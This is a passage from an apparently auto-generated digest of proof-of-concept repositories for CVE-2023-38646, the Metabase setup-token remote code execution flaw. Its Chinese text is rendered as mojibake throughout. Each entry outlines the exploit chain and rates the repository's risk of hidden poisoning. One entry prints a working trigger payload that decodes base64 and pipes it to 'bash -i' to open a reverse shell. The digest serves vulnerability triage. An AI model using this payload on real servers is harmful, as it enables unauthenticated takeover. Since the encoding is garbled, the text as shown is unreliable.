**æ¥æº**: [CVE-2023-38646-alexandre-pecorilla_CVE-2023-38646.md](../2023/CVE-2023-38646-alexandre-pecorilla_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 (å¼€æºç‰ˆ), < 1.46.6.1 (ä¼ä¸šç‰ˆ)

**åˆ©ç”¨æ¡ä»¶:** Metabaseå®ä¾‹å¯¹å¤–å¼€æ”¾ï¼Œä¸”ç‰ˆæœ¬ä½äºå®‰å…¨ç‰ˆæœ¬ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯ã€æœç´¢ç»“æœä»¥åŠæä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç ï¼Œå¯ä»¥åšå‡ºä»¥ä¸‹åˆ¤æ–­ï¼š

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„POCä»£ç æœ‰æ•ˆã€‚ä»£ç åˆ©ç”¨äº† Metabase åœ¨è®¾ç½®è¿‡ç¨‹ä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´é€šè¿‡æ„é€ æ¶æ„çš„æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²æ¥æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æŠ•æ¯’é£é™©ï¼š**
æŸ¥çœ‹æä¾›çš„POCä»£ç ï¼Œå¹¶æœªå‘ç°æ˜æ˜¾çš„æŠ•æ¯’ä»£ç ã€‚è¯¥POCè„šæœ¬çš„åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´æ‰§è¡Œåå¼¹shellï¼Œå°†ç›®æ ‡æœºå™¨çš„shellåå¼¹åˆ°æ”»å‡»è€…æŒ‡å®šçš„IPå’Œç«¯å£ã€‚ä¸»è¦é€»è¾‘éƒ½åœ¨æ„é€ payloadä¸Šï¼Œæ²¡æœ‰å‘ç°ä½œè€…éšè—çš„æ¶æ„ä»£ç ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…é¦–å…ˆéœ€è¦è·å– Metabase å®ä¾‹çš„ `setup-token`ã€‚è¿™ä¸ªtokenå¯ä»¥é€šè¿‡è®¿é—® `/api/session/properties` æ¥å£è·å¾—ï¼Œè¯¥æ¥å£æ— éœ€èº«ä»½éªŒè¯ã€‚
2.  æ”»å‡»è€…æ„é€ ä¸€ä¸ªæ¶æ„çš„ `payload`ï¼Œå…¶ä¸­åŒ…å«æ¶æ„çš„æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ã€‚è¯¥å­—ç¬¦ä¸²åˆ©ç”¨ H2 æ•°æ®åº“çš„ç‰¹æ€§ï¼Œåœ¨è¿æ¥æ—¶æ‰§è¡Œä»»æ„ Java ä»£ç ã€‚
3.  æ”»å‡»è€…å°†æ„é€ çš„ `payload` å‘é€åˆ° `/api/setup/validate` æ¥å£ã€‚
4.  Metabase å°è¯•è¿æ¥æ¶æ„æ•°æ®åº“ï¼Œä»è€Œè§¦å‘æ¼æ´ï¼Œæ‰§è¡Œæ”»å‡»è€…æŒ‡å®šçš„å‘½ä»¤ï¼Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚å…·ä½“æ˜¯é€šè¿‡åˆ›å»ºä¸€ä¸ªè§¦å‘å™¨ï¼Œåœ¨æŸ¥è¯¢ `INFORMATION_SCHEMA.TABLES` è¡¨ä¹‹å‰æ‰§è¡Œä¸€æ®µ JavaScript ä»£ç ï¼Œè¿™æ®µä»£ç ä¼šè°ƒç”¨ `java.lang.Runtime.getRuntime().exec()` æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚
5.  POCä»£ç ä¸­ï¼Œåˆ©ç”¨ `bash -c` å’Œ `base64` å‘½ä»¤ç»„åˆï¼Œæ‰§è¡Œ base64 ç¼–ç åçš„åå¼¹ shell å‘½ä»¤ï¼Œå®ç°åå¼¹ shellã€‚

**é¡¹ç›®åœ°å€:** [alexandre-pecorilla/CVE-2023-38646](https://github.com/alexandre-pecorilla/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #18

**æ¥æº**: [CVE-2023-38646-asepsaepdin_CVE-2023-38646.md](../2023/CVE-2023-38646-asepsaepdin_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 (å¼€æºç‰ˆ) å’Œ < 1.46.6.1 (ä¼ä¸šç‰ˆ)

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹ç‰ˆæœ¬ä½äºå—å½±å“ç‰ˆæœ¬ï¼Œä¸”å¯ä»¥é€šè¿‡HTTP/HTTPSè®¿é—®ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646æ˜¯Metabaseä¸­çš„ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢å¼•æ“ç»“æœï¼Œæœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ¼æ´åˆ©ç”¨ä»£ç `CVE-2023-38646-POC.py`å’Œ`CVE-2023-38646-Reverse-Shell.py`æä¾›äº†ä¸¤ç§åˆ©ç”¨æ–¹å¼ï¼š

1.  **æ¼æ´åˆ©ç”¨æ–¹å¼ï¼š**
    *   **è·å–Setup Tokenï¼š** é¦–å…ˆï¼Œ`CVE-2023-38646-POC.py` è„šæœ¬é€šè¿‡è®¿é—®`/api/session/properties`ç«¯ç‚¹æ¥è·å–Metabaseå®ä¾‹çš„Setup Tokenã€‚è¯¥Tokenåœ¨åˆå§‹åŒ–è®¾ç½®é˜¶æ®µä½¿ç”¨ï¼Œæ˜¯åç»­åˆ©ç”¨çš„å…³é”®ã€‚
    *   **Reverse Shellåˆ©ç”¨ï¼š** `CVE-2023-38646-Reverse-Shell.py` è„šæœ¬åˆ©ç”¨è·å–çš„Setup Tokenï¼Œé€šè¿‡å‘`/api/setup/validate`ç«¯ç‚¹å‘é€POSTè¯·æ±‚ï¼Œå¹¶æ„é€ æ¶æ„çš„H2æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ï¼Œå°†Payloadæ³¨å…¥åˆ°æ•°æ®åº“é…ç½®ä¸­ã€‚è¯¥Payloadä¼šæ‰§è¡Œä¸€ä¸ªåå‘Shellå‘½ä»¤ï¼Œè¿æ¥åˆ°æ”»å‡»è€…æŒ‡å®šçš„IPåœ°å€å’Œç«¯å£ï¼Œä»è€Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

2.  **æœ‰æ•ˆæ€§ï¼š**
    æ ¹æ®æ¼æ´ä¿¡æ¯ã€æœç´¢ç»“æœå’Œæä¾›çš„POCä»£ç ï¼Œå¯ä»¥åˆ¤æ–­æ­¤POC**æœ‰æ•ˆ**ã€‚å¤šä¸ªæ¥æºè¯å®äº†è¯¥æ¼æ´çš„å­˜åœ¨å’Œå¯åˆ©ç”¨æ€§ï¼Œå¹¶ä¸”æä¾›äº†å¯æ“ä½œçš„POCã€‚

3.  **æŠ•æ¯’é£é™©ï¼š**
    ä»£ç ä¸­å‘ç°çš„æ½œåœ¨æŠ•æ¯’é£é™©è¾ƒä½ï¼Œçº¦ä¸º10%ã€‚ä¸»è¦åˆ†æå¦‚ä¸‹ï¼š
    *   `CVE-2023-38646-POC.py` ä¸»è¦ç”¨äºè·å–Setup Tokenï¼ŒåŠŸèƒ½æ¯”è¾ƒç®€å•ï¼Œæ²¡æœ‰æ˜æ˜¾çš„æ¶æ„è¡Œä¸ºã€‚
    *   `CVE-2023-38646-Reverse-Shell.py` çš„ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨Setup Tokenæ‰§è¡ŒRCEï¼Œä½†æ˜¯æ”»å‡»è€…å¯ä»¥è‡ªå®šä¹‰åå‘è¿æ¥çš„IPå’Œç«¯å£ï¼Œå› æ­¤ä»£ç æœ¬èº«åªæ˜¯æä¾›äº†ä¸€ä¸ªæ¡†æ¶ã€‚é£é™©ç‚¹åœ¨äºå¦‚æœæ”»å‡»è€…ä¸å°å¿ƒä½¿ç”¨äº†é”™è¯¯çš„payloadï¼Œå¯èƒ½å¯¼è‡´ç›®æ ‡ç³»ç»Ÿå´©æºƒæˆ–å…¶ä»–å¼‚å¸¸ã€‚

   æ€»ä½“æ¥è¯´ï¼Œé£é™©ä¸»è¦é›†ä¸­åœ¨payloadçš„æ„å»ºå’Œæ‰§è¡Œä¸Šï¼Œè€Œéä»£ç æœ¬èº«å­˜åœ¨æ¶æ„æ³¨å…¥ã€‚ä½†ä¾æ—§éœ€è¦å¯¹ä¸‹è½½çš„è„šæœ¬è¿›è¡Œå…¨é¢çš„ä»£ç å®¡è®¡ã€‚


**é¡¹ç›®åœ°å€:** [asepsaepdin/CVE-2023-38646](https://github.com/asepsaepdin/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #19

**æ¥æº**: [CVE-2023-38646-birdm4nw_CVE-2023-38646.md](../2023/CVE-2023-38646-birdm4nw_CVE-2023-38646.md)

## CVE-2023-38646 - Metabase RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…ä»¥æœåŠ¡å™¨æƒé™æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 (å¼€æºç‰ˆ), < 1.46.6.1 (ä¼ä¸šç‰ˆ), å…¶ä»–å—å½±å“ç‰ˆæœ¬åŒ…æ‹¬ 0.45.4.1, 1.45.4.1, 0.44.7.1, 1.44.7.1, 0.43.7.2, å’Œ 1.43.7.2.

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹è¿è¡Œåœ¨å—å½±å“ç‰ˆæœ¬ï¼Œä¸”æ”»å‡»è€…å¯ä»¥è®¿é—®MetabaseæœåŠ¡ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2023-38646 æ˜¯ Metabase ä¸­çš„ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥é€šè¿‡ç²¾å¿ƒæ„é€ çš„è¯·æ±‚åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚åˆ©ç”¨æ–¹å¼å¦‚ä¸‹ï¼š

1.  **è·å–setup-token:**  æ”»å‡»è€…é¦–å…ˆå‘ `/api/session/properties` å‘é€ GET è¯·æ±‚ï¼Œæå– `setup-token`ã€‚
2.  **æ„é€ æ¶æ„payload:**  æ„é€ åŒ…å«æ¶æ„H2æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²çš„ JSON payloadã€‚è¯¥è¿æ¥å­—ç¬¦ä¸²åˆ©ç”¨ `TRACE_LEVEL_SYSTEM_OUT` å‚æ•°å’Œ `CREATE TRIGGER` è¯­å¥ï¼Œåœ¨H2æ•°æ®åº“ä¸­åˆ›å»ºä¸€ä¸ªè§¦å‘å™¨ï¼Œè¯¥è§¦å‘å™¨åœ¨æ¯æ¬¡ä» `INFORMATION_SCHEMA.TABLES` è¡¨ä¸­é€‰æ‹©æ•°æ®ä¹‹å‰æ‰§è¡Œã€‚è§¦å‘å™¨ä¸­åŒ…å«çš„ Javascript ä»£ç ä½¿ç”¨ `java.lang.Runtime.getRuntime().exec()` æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚
3.  **å‘é€payload:**  å°†æ„é€ å¥½çš„ payload å‘é€åˆ° `/api/setup/validate` æ¥å£ã€‚
4.  **æ‰§è¡Œå‘½ä»¤:**  Metabase å°è¯•ä½¿ç”¨æä¾›çš„æ•°æ®åº“è¿æ¥ï¼Œè§¦å‘æ¶æ„çš„ H2 è§¦å‘å™¨ï¼Œä»è€Œæ‰§è¡Œæ”»å‡»è€…æ³¨å…¥çš„å‘½ä»¤ã€‚

è¯¥æ¼æ´åˆ©ç”¨ä»£ç é¦–å…ˆè·å–Metabaseçš„`setup-token`ï¼Œç„¶åæ„é€ ä¸€ä¸ªæ¶æ„çš„H2æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ï¼Œé€šè¿‡`TRACE_LEVEL_SYSTEM_OUT`å’Œ`CREATE TRIGGER`æœºåˆ¶æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚ä»£ç ä¸­ä½¿ç”¨äº†base64ç¼–ç æ¥ç»•è¿‡ä¸€äº›è¿‡æ»¤ï¼Œå¹¶åœ¨payloadä¸­éšæœºç”Ÿæˆå­—ç¬¦ä¸²æ¥é¿å…ç¼“å­˜ç­‰é—®é¢˜ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

æŸ¥çœ‹æ¼æ´åˆ©ç”¨ä»£ç ï¼Œå¹¶æ²¡æœ‰å‘ç°æ˜æ˜¾çš„æ¶æ„ä»£ç ã€‚ä»£ç çš„åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´è¿›è¡Œåå¼¹shellï¼Œè™½ç„¶åå¼¹shellæœ¬èº«å…·æœ‰ä¸€å®šçš„é£é™©ï¼Œä½†è¿™æ˜¯æ¼æ´åˆ©ç”¨çš„æ­£å¸¸è¡Œä¸ºï¼Œä¸åº”è§†ä¸ºæŠ•æ¯’ã€‚`README.md`æ–‡ä»¶ä¹Ÿæ²¡æœ‰ä»»ä½•å¯ç–‘ä¹‹å¤„ã€‚å¯ä»¥åˆ¤æ–­æ­¤ä»“åº“ä¸­ä½œè€…éšè—æŠ•æ¯’ä»£ç çš„å¯èƒ½æ€§å¾ˆä½ï¼Œæ¦‚ç‡ä¸º0%ã€‚

**é¡¹ç›®åœ°å€:** [birdm4nw/CVE-2023-38646](https://github.com/birdm4nw/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #20

**æ¥æº**: [CVE-2023-38646-j0yb0y0h_CVE-2023-38646.md](../2023/CVE-2023-38646-j0yb0y0h_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»æˆæƒçš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** Metabase open source < 0.46.6.1 å’Œ Metabase Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡ç³»ç»Ÿè¿è¡Œå­˜åœ¨æ¼æ´çš„Metabaseç‰ˆæœ¬ï¼Œä¸”æ”»å‡»è€…å¯ä»¥è®¿é—®MetabaseæœåŠ¡ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œæƒé™ä¸æœåŠ¡å™¨ç›¸åŒã€‚æ¼æ´å­˜åœ¨äº Metabase çš„è®¾ç½®æµç¨‹ä¸­ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨ H2 æ•°æ®åº“çš„ç‰¹æ€§ï¼Œé€šè¿‡æ„é€ æ¶æ„çš„æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²æ¥æ‰§è¡Œä»»æ„ä»£ç ã€‚

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„POCä»£ç æ˜¯æœ‰æ•ˆçš„ã€‚å®ƒé€šè¿‡ä»¥ä¸‹æ­¥éª¤åˆ©ç”¨æ¼æ´ï¼š
1.  è·å– setup-token, ç”¨äºåç»­çš„åˆ©ç”¨ã€‚
2.  æ„é€ åŒ…å«æ¶æ„ H2 æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²çš„ POST è¯·æ±‚ï¼Œå‘é€åˆ° /api/setup/validate æ¥å£ã€‚è¯¥å­—ç¬¦ä¸²åŒ…å«ä¸€ä¸ª SQL è§¦å‘å™¨ï¼Œè¯¥è§¦å‘å™¨åœ¨è®¿é—® INFORMATION_SCHEMA.TABLES æ—¶æ‰§è¡Œä»»æ„çš„ base64 ç¼–ç çš„å‘½ä»¤ã€‚
3.  æ‰§è¡Œçš„å‘½ä»¤æ˜¯åå¼¹shellï¼Œå°†ç›®æ ‡æœåŠ¡å™¨çš„ shell é‡å®šå‘åˆ°æ”»å‡»è€…çš„ IP åœ°å€å’Œç«¯å£ã€‚

**æŠ•æ¯’é£é™©ï¼š**
ä»“åº“ä¸­å¯èƒ½å­˜åœ¨æŠ•æ¯’ä»£ç çš„é£é™©è¾ƒä½ï¼Œå¤§çº¦ä¸º 10%ã€‚ä¸»è¦é£é™©æ¥è‡ªäºï¼š
1.  `add_padding`å‡½æ•°ï¼šè¿™ä¸ªå‡½æ•°çœ‹ä¼¼æ˜¯ä¸ºäº†æ¶ˆé™¤ base64 ç¼–ç åçš„ç­‰å·ï¼Œä½†æ¶æ„æ”»å‡»è€…å¯èƒ½é€šè¿‡ä¿®æ”¹æ­¤å‡½æ•°æ¥æ’å…¥æ¶æ„ä»£ç ï¼Œè™½ç„¶å½“å‰çš„ç›®çš„æ˜¯ä¸ºäº†ç»•è¿‡æŸäº›è¿‡æ»¤æœºåˆ¶ï¼Œä½†å­˜åœ¨è¢«æ»¥ç”¨çš„é£é™©ï¼Œé€šè¿‡ä¿®æ”¹payloadæ„é€ è¿‡ç¨‹æ¤å…¥æ¶æ„ä»£ç ã€‚
2.  åå¼¹ Shell çš„IPå’Œç«¯å£æ˜¯ç”¨æˆ·æŒ‡å®šçš„ï¼Œè¿™æ„å‘³ç€æ”»å‡»è€…æ— æ³•é€šè¿‡ç›´æ¥ä¿®æ”¹ä»£ç æ¥æ¤å…¥åé—¨ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  **æ¼æ´å®šä½ï¼š** æ¼æ´å­˜åœ¨äºMetabaseçš„å®‰è£…è®¾ç½®é˜¶æ®µï¼Œå…·ä½“ä½äº`api/setup/validate`æ¥å£ã€‚
2.  **è·å–Tokenï¼š** é€šè¿‡è®¿é—®`/api/session/properties`è·å–`setup-token`ï¼Œè¿™æ˜¯åˆ©ç”¨æ¼æ´çš„å‰æã€‚
3.  **æ„é€ Payloadï¼š**  æ ¸å¿ƒåœ¨äºæ„é€ æ¶æ„çš„H2æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ã€‚è¯¥å­—ç¬¦ä¸²åŒ…å«ä»¥ä¸‹å…³é”®éƒ¨åˆ†ï¼š
    *   `zip:/app/metabase.jar!/sample-database.db`ï¼šæŒ‡å®šæ•°æ®åº“æ–‡ä»¶çš„ä½ç½®ã€‚
    *   `MODE=MSSQLServer`ï¼šè®¾ç½®æ•°æ®åº“æ¨¡å¼ä¸ºMSSQLServerï¼Œè¿™æ˜¯è§¦å‘æ¼æ´çš„å¿…è¦æ¡ä»¶ã€‚
    *   `TRACE_LEVEL_SYSTEM_OUT=1`ï¼šå¯ç”¨ç³»ç»Ÿè¾“å‡ºè·Ÿè¸ªã€‚
    *   `CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {{echo,{payload}}}|{{base64,-d}}|{{bash,-i}}')\n$$--=x`ï¼šåˆ›å»ºä¸€ä¸ªåä¸º`pwnshell`çš„è§¦å‘å™¨ï¼Œåœ¨æŸ¥è¯¢`INFORMATION_SCHEMA.TABLES`è¡¨ä¹‹å‰æ‰§è¡Œã€‚è§¦å‘å™¨ä½¿ç”¨ JavaScript è°ƒç”¨ `java.lang.Runtime.getRuntime().exec()` æ‰§è¡Œåå¼¹shellå‘½ä»¤ã€‚`{payload}`ä¼šè¢«æ›¿æ¢ä¸ºbase64ç¼–ç åçš„åå¼¹shellå‘½ä»¤ï¼Œå…¶ä¸­åˆ©ç”¨äº†bashçš„ç‰¹æ€§è¿›è¡Œè§£ç å’Œæ‰§è¡Œã€‚
4.  **å‘é€è¯·æ±‚ï¼š** å°†æ„é€ å¥½çš„åŒ…å«payloadçš„JSONæ•°æ®ï¼Œé€šè¿‡POSTè¯·æ±‚å‘é€åˆ°`/api/setup/validate`æ¥å£ã€‚
5.  **æ‰§è¡Œå‘½ä»¤ï¼š**  å½“Metabaseå°è¯•è¿æ¥åˆ°æ¶æ„æ„é€ çš„æ•°æ®åº“æ—¶ï¼Œè§¦å‘å™¨è¢«æ‰§è¡Œï¼Œä»è€Œåœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**é¡¹ç›®åœ°å€:** [j0yb0y0h/CVE-2023-38646](https://github.com/j0yb0y0h/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #21

**æ¥æº**: [CVE-2023-38646-junnythemarksman_CVE-2023-38646.md](../2023/CVE-2023-38646-junnythemarksman_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæ— éœ€è®¤è¯å³å¯è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 å’Œ < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹æœªæ‰“è¡¥ä¸ä¸”ç½‘ç»œå¯è¾¾

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 æ˜¯ Metabase ä¸­å­˜åœ¨çš„ä¸€ä¸ªæ— éœ€è®¤è¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æ”»å‡»è€…é€šè¿‡å‘é€ç‰¹åˆ¶çš„ POST è¯·æ±‚åˆ° `/api/setup/validate` æ¥å£ï¼Œåˆ©ç”¨ H2 æ•°æ®åº“çš„ç‰¹æ€§ï¼Œåœ¨ `subname` å­—æ®µä¸­æ³¨å…¥æ¶æ„çš„ JDBC URLã€‚è¯¥URLåŒ…å«ä¸€ä¸ªCREATE TRIGGERè¯­å¥ï¼Œè¯¥è¯­å¥åœ¨INFORMATION_SCHEMA.TABLESè¡¨ä¸Šåˆ›å»ºä¸€ä¸ªè§¦å‘å™¨ï¼Œè¯¥è§¦å‘å™¨æ‰§è¡Œä»»æ„ Java ä»£ç ï¼Œä»è€Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚åˆ©ç”¨æ–¹å¼æ˜¯é€šè¿‡æä¾›ä¸€ä¸ªåŒ…å«åå¼¹shellå‘½ä»¤çš„payloadï¼Œè¯¥å‘½ä»¤ä¼šè¢«base64ç¼–ç åæ‰§è¡Œã€‚æ¼æ´åˆ©ç”¨ä»£ç ä¸­çš„æŠ•æ¯’é£é™©è¾ƒä½ï¼Œä¸»è¦æ˜¯é€šè¿‡ç¯¡æ”¹IPå’Œç«¯å£è¿›è¡Œæ¶æ„è¿æ¥ï¼Œå­˜åœ¨å°‘é‡é£é™©ã€‚ è„šæœ¬è¦æ±‚ç”¨æˆ·æŒ‡å®šç›®æ ‡ URL å’Œ tokenï¼Œ token é€šè¿‡ `/api/session/properties` è·å–ã€‚

**æ¼æ´åˆ©ç”¨æ–¹å¼ï¼š**

1.  è·å–ç›®æ ‡ Metabase å®ä¾‹çš„ URL å’Œ tokenï¼ˆé€šè¿‡è®¿é—® `/api/session/properties` è·å–ï¼‰ã€‚
2.  é…ç½®æ¼æ´åˆ©ç”¨è„šæœ¬ `exploit.py`ï¼Œè®¾ç½®ç›®æ ‡ URLã€tokenã€æ”»å‡»è€…çš„ IP åœ°å€å’Œç«¯å£ã€‚
3.  è¿è¡Œè„šæœ¬ï¼Œè„šæœ¬å°†å‘é€åŒ…å«æ¶æ„ JDBC URL çš„ POST è¯·æ±‚åˆ°ç›®æ ‡ Metabase å®ä¾‹ã€‚
4.  ç›®æ ‡ Metabase å®ä¾‹æ‰§è¡Œæ¶æ„ä»£ç ï¼Œåå¼¹ shell åˆ°æ”»å‡»è€…æŒ‡å®šçš„ IP åœ°å€å’Œç«¯å£ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

ä»£ç ä¸»è¦åŠŸèƒ½æ˜¯æ„é€ å’Œå‘é€æ¶æ„è¯·æ±‚ï¼Œè™½ç„¶å­˜åœ¨é€šè¿‡ä¿®æ”¹IPç«¯å£è¿›è¡Œæ¶æ„è¿æ¥çš„é£é™©ï¼Œ ä½†æ˜¯éœ€è¦ä½¿ç”¨è€…è‡ªè¡Œé…ç½®ã€‚æ‰€ä»¥æŠ•æ¯’é£é™©è¾ƒä½ï¼Œçº¦ä¸º10%ã€‚

**é¡¹ç›®åœ°å€:** [junnythemarksman/CVE-2023-38646](https://github.com/junnythemarksman/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #22

**æ¥æº**: [CVE-2023-38646-kh4sh3i_CVE-2023-38646.md](../2023/CVE-2023-38646-kh4sh3i_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-è¿œç¨‹ä»£ç æ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯å³å¯è¿œç¨‹æ‰§è¡Œä»£ç 

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 å’Œ Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹å¯è¢«ç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 1%

## è¯¦æƒ…

CVE-2023-38646æ˜¯Metabaseçš„ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼Œå­˜åœ¨äº0.46.6.1ä¹‹å‰çš„å¼€æºç‰ˆæœ¬å’Œ1.46.6.1ä¹‹å‰çš„ä¼ä¸šç‰ˆæœ¬ä¸­ã€‚æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚è¯¥æ¼æ´çš„åˆ©ç”¨æ–¹å¼æ˜¯ï¼Œé€šè¿‡å‘é€ç‰¹åˆ¶çš„HTTPè¯·æ±‚åˆ°/api/setup/validateç«¯ç‚¹ï¼Œå…¶ä¸­åŒ…å«æ¶æ„æ„é€ çš„JSON payloadã€‚è¯¥payloadåˆ©ç”¨H2æ•°æ®åº“çš„ç‰¹æ€§ï¼Œé€šè¿‡`CREATE ALIAS`è¯­å¥åˆ›å»ºä¸€ä¸ªåä¸º`SHELLEXEC`çš„å‡½æ•°ï¼Œè¯¥å‡½æ•°å¯ä»¥æ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ã€‚PoCä»£ç 